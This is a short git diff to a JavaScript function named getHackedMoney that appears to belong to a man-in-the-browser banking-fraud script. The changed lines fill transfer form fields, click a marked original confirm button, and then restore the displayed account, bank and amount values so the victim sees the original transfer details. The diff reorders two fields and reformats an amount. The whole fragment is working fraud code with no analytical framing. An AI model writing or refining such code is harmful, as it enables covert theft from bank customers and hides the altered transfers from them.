@@ -228,8 +228,8 @@ function getHackedMoney(realMoney) {
 		 		 storedTransfers = loadTransfers();
 		 		lastTransfer = storedTransfers[storedTransfers.length - 1];
 		 		
-				$("input:eq(1)").val(lastTransfer.acc_Name);
-				$("input:eq(2)").val(lastTransfer.acc_Nr);
+				$("input:eq(1)").val(lastTransfer.acc_Nr);
+				$("input:eq(2)").val(lastTransfer.acc_Name);
 				$("input:eq(3)").val(lastTransfer.bank_BLZ);
 				$("input:eq(4)").val(lastTransfer.bank_Name);
 				$("input:eq(5)").val(lastTransfer.amount);
@@ -265,8 +265,8 @@ function getHackedMoney(realMoney) {
 	 				$("button[hackMarkerConfirmBtnOrig='true']")[0].click();
 	 				
 	 				//and change displayed values back
-	 				$("input:eq(1)").val(lastTransfer.acc_Name);
-					$("input:eq(2)").val(lastTransfer.acc_Nr);
+	 				$("input:eq(1)").val(lastTransfer.acc_Nr);
+					$("input:eq(2)").val(lastTransfer.acc_Name);
 					$("input:eq(3)").val(lastTransfer.bank_BLZ);
 					$("input:eq(4)").val(lastTransfer.bank_Name);
 					$("input:eq(5)").val(lastTransfer.amount);
@@ -356,7 +356,7 @@ function getHackedMoney(realMoney) {
 		 		remark.text(originalData.remark);
 		 		
 		 		var amount = 	$(this).next().next().next().children();
-		 		amount.text(originalData.amount);
+		 		amount.text(outputMoney(originalData.amount));
 
 		 		
 		 		$(this).parent().show();
